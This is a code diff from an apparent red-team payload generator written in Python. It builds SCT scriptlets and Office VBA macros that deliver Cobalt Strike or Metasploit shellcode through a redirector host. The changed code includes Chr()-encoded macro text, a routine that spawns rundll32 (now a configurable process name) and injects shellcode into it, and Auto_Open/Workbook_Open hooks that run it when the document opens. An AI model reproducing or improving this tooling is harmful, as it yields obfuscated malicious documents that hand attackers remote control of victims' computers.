@@ -28,11 +28,11 @@ def genSCT(framework, stagingMethod, redirector, x86, x64, cspayload='cs.sct'):
 	fileFindReplace('payload.sct', 'exampleprogid', genProgID())
 	fileFindReplace('payload.sct', 'exampleclassid', str(genClassID()))
 	if 'CobaltStrike' in framework:
-		modifyCobaltStrikePayload(cspayload ,x86, x64)
+		modifyCobaltStrikePayload(cspayload , x86, x64)
 	elif 'Metasploit' in framework:
 		if 'VBAMacro' in stagingMethod:
 			msfShellCode = getMetasploitShellCode(redirector)
-			macro = genVBAMacro(convertToVBAFormat(encodeStringAsChr(msfShellCode)), redirector)
+			macro = genVBAMacro(convertToVBAFormat(encodeStringAsChr(msfShellCode)), redirector, x86, x64)
 			fileFindReplace('payload.sct', '\'Insert', macro)
 	else:
 		print('{0} framework is not supported yet' % framework)
@@ -46,7 +46,7 @@ def genProgID(size=8, chars=ascii_uppercase + digits):
 	progid = ''.join(choice(chars) for _ in range(size))
 	return progid
 
-def genVBAMacro(shellCode, redirector):
+def genVBAMacro(shellCode, redirector, x86, x64):
 	'''
 	Generates a visual basic macro. This is a lazy version until we 
 	write a Chr encoding function that accounts for string concatenation
@@ -183,17 +183,16 @@ Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(115)&Chr(80)&Chr(114)&Chr(
 Chr(84)&Chr(104)&Chr(101)&Chr(110)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(114)&Chr(119)&Chr(120)&Chr(112)&Chr(97)&Chr(103)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(44)& _
 Chr(32)&Chr(114)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(10)&Chr(35)&Chr(69)&Chr(108)&Chr(115)&Chr(101)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(114)&Chr(119)& _
 Chr(120)&Chr(112)&Chr(97)&Chr(103)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(114)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(35)&Chr(69)&Chr(110)&Chr(100)&Chr(32)& _
-Chr(73)&Chr(102)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(109)&Chr(121)&Chr(65)&Chr(114)&Chr(114)&Chr(97)&Chr(121)&Chr(32)&Chr(61)&Chr(32)& _
-	'''
+Chr(73)&Chr(102)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(109)&Chr(121)&Chr(65)&Chr(114)&Chr(114)&Chr(97)&Chr(121)&Chr(32)&Chr(61)&Chr(32)& _'''
 
 	for line in shellCode:
 		start += line + "\n"
 
 	execution = '''
 	If Len(Environ("ProgramW6432")) > 0 Then        
-		sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"    
+		sProc = Environ("windir") & "\\SysWOW64\\{0}"
 	Else        
-		sProc = Environ("windir") & "\\System32\\rundll32.exe"  
+		sProc = Environ("windir") & "\\System32\\{1}"
 	End If    
 
 	res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)    
@@ -213,7 +212,7 @@ End Sub
 
 Sub Workbook_Open()
     Auto_Open
-End Sub'''
+End Sub'''.format(x86, x64)
 	print(convertToVBAFormat(encodeStringAsChr(execution)))
 
 	middle = ''
